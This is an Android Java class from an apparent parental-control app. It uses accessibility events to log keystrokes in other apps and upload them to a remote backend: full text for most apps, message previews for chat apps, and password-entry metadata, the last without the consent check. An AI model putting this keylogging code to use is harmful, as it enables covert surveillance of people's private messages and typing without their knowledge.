package com.parentalcontrol.monitor;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.util.HashSet;
import java.util.Set;

public class KeyboardMonitor {
    
    private static final String TAG = "KeyboardMonitor";
    private Context context;
    private SupabaseClient supabaseClient;
    private String deviceId;
    private Set<String> sensitiveApps;
    
    public KeyboardMonitor(Context context) {
        this.context = context;
        this.supabaseClient = new SupabaseClient(context);
        this.deviceId = DeviceUtils.getDeviceId(context);
        
        // Initialize sensitive apps that we want to monitor more closely
        sensitiveApps = new HashSet<>();
        sensitiveApps.add("com.whatsapp");
        sensitiveApps.add("com.facebook.katana");
        sensitiveApps.add("com.instagram.android");
        sensitiveApps.add("com.snapchat.android");
        sensitiveApps.add("com.twitter.android");
        sensitiveApps.add("com.tiktok");
        sensitiveApps.add("com.telegram.messenger");
        sensitiveApps.add("com.viber.voip");
        sensitiveApps.add("com.skype.raider");
        sensitiveApps.add("com.discord");
        sensitiveApps.add("com.android.mms");
        sensitiveApps.add("com.google.android.apps.messaging");
    }
    
    public void processTextInputEvent(AccessibilityEvent event) {
        // Check if consent is granted
        SharedPreferences prefs = context.getSharedPreferences("ParentalControl", Context.MODE_PRIVATE);
        boolean consentGranted = prefs.getBoolean("consent_granted", false);
        
        if (!consentGranted) {
            return;
        }
        
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // Get the text that was entered
            String inputText = "";
            if (event.getText() != null && !event.getText().isEmpty()) {
                inputText = event.getText().toString();
            }
            
            // Create activity data
            JSONObject keyboardData = new JSONObject();
            keyboardData.put("packageName", packageName);
            keyboardData.put("className", className);
            keyboardData.put("timestamp", System.currentTimeMillis());
            keyboardData.put("inputLength", inputText.length());
            keyboardData.put("isSensitiveApp", sensitiveApps.contains(packageName));
            
            // For sensitive apps, log more details (but respect privacy)
            if (sensitiveApps.contains(packageName)) {
                keyboardData.put("inputType", "messaging");
                // Only log first few characters for context, not full message
                if (inputText.length() > 0) {
                    keyboardData.put("inputPreview", inputText.length() > 10 ? 
                        inputText.substring(0, 10) + "..." : inputText);
                }
            } else {
                keyboardData.put("inputType", "general");
                // For non-messaging apps, we can be more detailed
                keyboardData.put("inputText", inputText);
            }
            
            // Try to get additional context from accessibility node
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                keyboardData.put("viewId", source.getViewIdResourceName());
                keyboardData.put("contentDescription", source.getContentDescription());
                keyboardData.put("hint", source.getHintText());
            }
            
            // Log keyboard activity
            supabaseClient.logActivity(deviceId, "keyboard_input", keyboardData, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    Log.d(TAG, "Keyboard input logged for: " + packageName);
                }
                
                @Override
                public void onError(String error) {
                    Log.e(TAG, "Failed to log keyboard input: " + error);
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing keyboard input", e);
        }
    }
    
    public void processPasswordInput(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            JSONObject passwordData = new JSONObject();
            passwordData.put("packageName", packageName);
            passwordData.put("eventType", "password_input");
            passwordData.put("timestamp", System.currentTimeMillis());
            passwordData.put("inputLength", event.getText() != null ? event.getText().toString().length() : 0);
            
            // Log password input attempt (without actual password)
            supabaseClient.logActivity(deviceId, "keyboard_input", passwordData, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    Log.d(TAG, "Password input logged for: " + packageName);
                }
                
                @Override
                public void onError(String error) {
                    Log.e(TAG, "Failed to log password input: " + error);
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing password input", e);
        }
    }
    
    public void shutdown() {
        if (supabaseClient != null) {
            supabaseClient.shutdown();
        }
    }
}